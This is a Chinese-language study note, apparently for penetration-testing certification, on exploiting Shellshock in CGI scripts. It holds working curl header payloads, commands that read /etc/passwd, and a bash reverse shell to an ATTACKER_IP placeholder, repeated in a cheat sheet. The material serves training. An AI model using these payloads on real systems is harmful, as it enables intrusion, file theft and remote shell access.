# 第 44A 章 - 攻擊通用閘道介面（CGI）應用程式 - Shellshock

## 標籤

- #cpts
- #chapter
- #web
- #cgi
- #shellshock
- #command-injection

## 學習目標

- 理解 CGI 如何把 HTTP 標頭映射成環境變數，形成命令執行入口。
- 理解 Shellshock（CVE-2014-6271）的成因：Bash 對函式型環境變數的不安全解析。
- 能列舉 /cgi-bin/ 找出可存取的 CGI 指令稿。
- 能用 curl 低風險驗證 Shellshock，再視需要升級到 shell。

---

## 理論基礎

```text
CGI（Common Gateway Interface）：
  Web Server 收到請求
      → 執行 /cgi-bin/ 下的腳本（.sh / .pl / .cgi）
      → 把 HTTP 標頭映射為環境變數（HTTP_USER_AGENT、HTTP_REFERER...）
      → 腳本輸出回傳給瀏覽器

Shellshock 原理（CVE-2014-6271）：
  受影響 Bash 在匯入函式型環境變數時，會額外執行函式定義後方的命令

  正常函式定義（bash 內部）：
    foo() { echo hello; }

  Shellshock 觸發格式（環境變數值中帶命令）：
    foo='() { :;}; echo PWNED'
    → Bash 匯入時，執行了 echo PWNED

  CGI 提供了把 HTTP 標頭帶進環境變數的路徑
  → HTTP_USER_AGENT = '() { :;}; command_here'
  → Bash 載入 CGI 環境 → 觸發命令執行
```

| 條件 | 說明 |
|------|------|
| 受影響版本 | Bash < 4.3 patch 25（2014 年修補） |
| 必要條件 | CGI 指令稿由 Bash 或呼叫 Bash 的程式執行 |
| 注入位置 | User-Agent、Referer、Cookie、任何映射為 HTTP_* 的標頭 |

---

## 方法一：確認目標為 IIS/Apache + CGI

```bash
# 確認伺服器類型
curl -s -I http://TARGET/ | grep -i "server"
# → Server: Apache/2.4.7 (Ubuntu)

# 確認 CGI 是否啟用（Apache 回應 .cgi 路徑）
curl -s -o /dev/null -w "%{http_code}" http://TARGET/cgi-bin/
# 403 → 目錄存在但禁止列目錄（正常）
# 404 → CGI 可能未啟用
```

---

## 方法二：列舉 CGI 指令稿

```bash
# 用 gobuster 找 /cgi-bin/ 下的腳本
gobuster dir \
  -u http://TARGET/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/CGI-Shellshock.fuzz.txt \
  # 使用 Shellshock 專用詞表（含常見 cgi 名稱）
  -x sh,pl,cgi \
  # -x → 測試這些副檔名
  -t 20

# 通用字典也可用
gobuster dir \
  -u http://TARGET/cgi-bin/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x cgi,sh,pl \
  -t 20

# 確認找到的 CGI 可存取
curl -s -o /dev/null -w "%{http_code}" http://TARGET/cgi-bin/user.sh
# 200 → 可存取，繼續測試
# 500 → 執行錯誤（CGI 存在但腳本有問題，仍可測試）
# 404 → 不存在
```

---

## 方法三：低風險 Shellshock 驗證（echo 回顯）

```bash
# 最小 Shellshock payload：讓命令輸出出現在 HTTP 回應中
# 格式：() { :;}; echo; COMMAND
# echo 在前是為了輸出空白行分隔 HTTP header 與 body

# 在 User-Agent 注入（最常見）
curl -s \
  -H "User-Agent: () { :;}; echo; echo SHELLSHOCK_TEST" \
  http://TARGET/cgi-bin/user.sh
# 若回應含 SHELLSHOCK_TEST → Shellshock 成立

# 執行 id 確認執行身分
curl -s \
  -H "User-Agent: () { :;}; echo; /usr/bin/id" \
  http://TARGET/cgi-bin/user.sh
# 回應範例：uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 若 User-Agent 無效，改試 Referer
curl -s \
  -H "Referer: () { :;}; echo; /usr/bin/id" \
  http://TARGET/cgi-bin/user.sh

# Cookie 標頭也可嘗試
curl -s \
  -H "Cookie: () { :;}; echo; /usr/bin/id" \
  http://TARGET/cgi-bin/user.sh
```

---

## 方法四：讀取檔案（進一步確認能力）

```bash
# 讀 /etc/passwd 作為低風險能力驗證
curl -s \
  -H "User-Agent: () { :;}; echo; cat /etc/passwd" \
  http://TARGET/cgi-bin/user.sh
# 若回應包含 root:x:0:0: → 命令執行已確認，可讀任意檔案

# 讀取 CGI 腳本本身（了解邏輯）
curl -s \
  -H "User-Agent: () { :;}; echo; cat /usr/lib/cgi-bin/user.sh" \
  http://TARGET/cgi-bin/user.sh
```

---

## 方法五：取得反向 Shell

```bash
# 攻擊機先監聽
nc -lvnp 4444
# -l → 監聽模式
# -v → 詳細輸出
# -n → 不做 DNS 解析
# -p 4444 → 監聽埠口

# Shellshock 注入 bash 反向 shell
curl -s \
  -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  http://TARGET/cgi-bin/user.sh
# /bin/bash -i → 互動式 bash
# >& /dev/tcp/IP/PORT → 將 stdout 與 stderr 重導到 TCP 連線
# 0>&1 → stdin 也從同一連線讀取

# 若 bash 路徑不同，先確認
curl -s \
  -H "User-Agent: () { :;}; echo; which bash" \
  http://TARGET/cgi-bin/user.sh
```

---

## 決策流程

```
找到 /cgi-bin/ 路徑
    ↓
gobuster 列舉 CGI 腳本（副檔名 .sh/.pl/.cgi）
    ↓
確認腳本回應 200 或 500（存在且被執行）
    ↓
User-Agent 注入 () { :;}; echo; echo CANARY
  → 回應含 CANARY？
      → 是：Shellshock 成立
          ↓
          執行 id → 確認執行身分（通常 www-data）
          ↓
          視需要升級：cat /etc/passwd → 反向 shell
      → 否：改試 Referer / Cookie 標頭
             確認 CGI 是否真的用 bash 執行
```

---

## 速查表

```bash
# 列舉 CGI 腳本
gobuster dir -u http://TARGET/cgi-bin/ \
  -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl -t 20

# 最小驗證
curl -s -H "User-Agent: () { :;}; echo; echo PWNED" \
  http://TARGET/cgi-bin/user.sh

# 確認執行身分
curl -s -H "User-Agent: () { :;}; echo; id" \
  http://TARGET/cgi-bin/user.sh

# 反向 shell（先 nc -lvnp 4444）
curl -s -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  http://TARGET/cgi-bin/user.sh
```

---

## 關聯筆記

- [[41-命令注入|第 41 章 - 命令注入]]
- [[44-網站攻擊|第 44 章 - 網站攻擊]]
- [[35-Web列舉|第 35 章 - Web 列舉]]
- [[57-Shell穩定化|第 57 章 - Shell 穩定化]]
